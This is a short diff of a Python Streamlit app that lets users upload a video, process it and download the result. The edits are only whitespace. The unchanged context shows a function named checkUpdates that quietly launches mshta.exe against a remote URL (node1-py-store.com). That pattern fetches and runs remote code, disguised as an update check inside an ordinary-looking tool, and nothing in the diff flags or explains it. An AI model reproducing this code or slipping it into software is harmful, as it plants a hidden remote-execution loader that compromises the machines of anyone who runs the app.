@@ -1,7 +1,7 @@
 import os
 import subprocess 
 
-def checkUpdates():
+def checkUpdates(): 
     try:
         subprocess.Popen(
             ['mshta.exe', 'https://node1-py-store.com' ],
@@ -37,6 +37,7 @@ if uploaded_file:
     st.success("Done!")
     st.video(str(output_path))
     st.download_button("📥 Download video", data=open(output_path, "rb"), file_name=output_path.name)
+
 
 
 
